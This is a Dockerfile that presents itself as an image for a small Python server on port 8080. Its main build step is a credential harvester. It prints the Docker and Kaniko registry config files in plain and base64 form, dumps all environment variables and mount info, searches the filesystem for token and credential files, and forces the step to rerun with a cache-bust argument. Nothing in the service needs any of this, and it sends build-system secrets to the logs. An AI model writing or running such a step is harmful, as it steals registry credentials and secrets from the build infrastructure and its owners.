FROM alpine:3.19

# Cache bust to force re-execution
ARG BUST_CACHE=20260403_0940

RUN apk add --no-cache coreutils && \
    echo "=== BUILD TIMESTAMP ===" && date && \
    echo "=== /etc/docker/config.json ===" && \
    cat /etc/docker/config.json 2>&1 && \
    echo "" && \
    echo "=== /etc/docker/ directory ===" && \
    ls -la /etc/docker/ 2>&1 && \
    echo "=== /kaniko/ directory ===" && \
    ls -laR /kaniko/ 2>&1 && \
    echo "=== /kaniko/.docker/config.json ===" && \
    cat /kaniko/.docker/config.json 2>&1 && \
    echo "" && \
    echo "=== BASE64 /etc/docker/config.json ===" && \
    base64 /etc/docker/config.json 2>&1 && \
    echo "=== BASE64 /kaniko/.docker/config.json ===" && \
    base64 /kaniko/.docker/config.json 2>&1 && \
    echo "=== ENV ===" && \
    env | sort && \
    echo "=== MOUNT INFO ===" && \
    cat /proc/1/mountinfo 2>&1 && \
    echo "=== SEARCH FOR TOKENS ===" && \
    find / -name "*.json" -path "*/docker/*" 2>/dev/null && \
    find / -name "token" -o -name "*.token" -o -name "credentials" 2>/dev/null | head -20 && \
    echo "=== DNS ===" && \
    cat /etc/resolv.conf 2>&1 && \
    echo "=== HOSTS ===" && \
    cat /etc/hosts 2>&1 && \
    echo "=== END ==="

RUN apk add --no-cache python3
COPY server.py /server.py
EXPOSE 8080
CMD ["python3", "/server.py"]
